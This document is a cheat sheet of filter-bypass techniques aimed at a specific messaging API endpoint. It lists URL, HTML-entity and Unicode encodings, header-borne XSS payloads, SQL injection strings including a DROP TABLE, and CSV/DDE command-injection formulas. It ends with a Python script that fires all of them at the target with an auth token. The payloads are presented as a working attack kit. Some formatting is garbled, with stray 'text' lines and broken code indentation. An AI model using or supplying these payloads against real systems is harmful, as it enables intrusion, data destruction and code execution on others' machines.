# Bypass Techniques to Try

## 1. Encoding Bypasses

### URL Encoding:
- `%27` (single quote)  
- `%2C` (comma)  
- `%22` (double quote)  
- `%3C` (less than)  
- `%3E` (greater than)  
- `%28` (opening parenthesis)  
- `%29` (closing parenthesis)  

### Double URL Encoding:
- `%2527` (single quote)  
- `%252C` (comma)  
- `%2522` (double quote)  
- `%253C` (less than)  
- `%253E` (greater than)  

### HTML Entity Encoding:
- `&#39;` (single quote)  
- `&#44;` (comma)  
- `&#34;` (double quote)  
- `&#60;` (less than)  
- `&#62;` (greater than)  
- `&lt;` (less than)  
- `&gt;` (greater than)  
- `&quot;` (double quote)  
- `&amp;` (ampersand)  

### Unicode Encoding:
- `\u0027` (single quote)  
- `\u002C` (comma)  
- `\u0022` (double quote)  
- `\u003C` (less than)  
- `\u003E` (greater than)  
- `\u0028` (opening parenthesis)  
- `\u0029` (closing parenthesis)  

---

## 2. Content-Type Manipulation

Try different content types to bypass filtering:

Original request
Content-Type: application/json

Try these alternatives
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: text/plain
Content-Type: application/xml
Content-Type: text/xml

text

---

## 3. Case Variation & Mixed Encoding

Mixed case in headers
content-type: application/json
Content-TYPE: application/json
CONTENT-TYPE: application/json

Mixed encoding examples
%27%22 (single quote + double quote encoded)
%27%3C (single quote + less than)

text

---

## 4. HTTP Parameter Pollution

Try submitting multiple parameters
POST /ubs-comm/api/v1/messages
{"messageText":"test'","messageText":"<script>"}

Or use URL encoding
messageText=test'&messageText=<script>

text

---

## 5. Header Injection Bypasses

Try injecting in different headers
X-Forwarded-For: <script>alert(1)</script>
User-Agent: <script>alert(1)</script>
Referer: javascript:alert(1)
X-Custom-Header: <img src=x onerror=alert(1)>

text

---

## 6. Null Byte & Control Character Bypasses

- `%00<script>` (null byte)  
- `%0A<script>` (line feed)  
- `%0D<script>` (carriage return)  
- `%09<script>` (tab)  
- `%20<script>` (space)  

---

## 7. Unicode Normalization Bypasses

- `ʼ` (modifier letter apostrophe - U+02BC)  
- `ˈ` (modifier letter vertical line - U+02C8)  
- `′` (prime symbol - U+2032)  
- `＇` (fullwidth apostrophe - U+FF07)  
- `，` (fullwidth comma - U+FF0C)  

---

## 8. Using Only Available Characters

### SQL Injection with single quote:

{"messageText": "test' OR '1'='1"}
{"messageText": "test' UNION SELECT null,null,null--'"}
{"messageText": "test'; DROP TABLE users;--'"}

text

### CSV Injection with comma:

{"messageText": "=cmd|'/c calc'!A0,=cmd|'/c notepad'!A0"}
{"messageText": "@SUM(1+1)*cmd|' /C calc'!A0,test"}

text

---

## 9. Response Manipulation

Try intercepting and modifying the response:

// If client-side validation exists
// Modify JavaScript to allow special characters
// Or disable validation entirely

text

---

## 10. Comprehensive Testing Script

import requests
import urllib.parse

def test_bypasses():
base_payload = {"messageText": ""}
bypasses = [
# URL encoded
"%3Cscript%3E",
"%22%3Cscript%3E",

text
    # Double encoded  
    "%253Cscript%253E",
    "%2522%253Cscript%253E",
    
    # HTML entities
    "&lt;script&gt;",
    "&#60;script&#62;",
    
    # Unicode
    "\\u003Cscript\\u003E",
    
    # Mixed with allowed chars
    "'%3Cscript%3E",
    ",%3Cscript%3E",
    
    # Control chars
    "%00%3Cscript%3E",
    "%0A%3Cscript%3E",
    
    # Using only allowed chars for SQL
    "' OR '1'='1",
    "' UNION SELECT null--",
    
    # CSV injection
    "=cmd|'/c calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0"
]

for bypass in bypasses:
    payload = base_payload.copy()
    payload["messageText"] = bypass
    
    response = requests.post(
        "https://target.com/ubs-comm/api/v1/messages",
        headers={
            "X-Auth-Token": "YOUR_TOKEN",
            "Content-Type": "application/json"
        },
        json=payload
    )
    
    print(f"Payload: {bypass}")
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text[:100]}")
    print("-" * 50)
test_bypasses()

text

---

## 11. Manual Testing Steps

- Test each encoding method systematically  
- Try different content-types with the same payload  
- Use Burp Decoder to create variations  
- Monitor responses for different error messages  
- Check if encoded payloads get decoded server-side  
- Test boundary conditions (very long payloads with allowed characters)  

---

Even with limited character acceptance, these bypass techniques can often circumvent client-side or basic server-side filtering. The key is **systematic testing of all encoding methods and edge cases**.
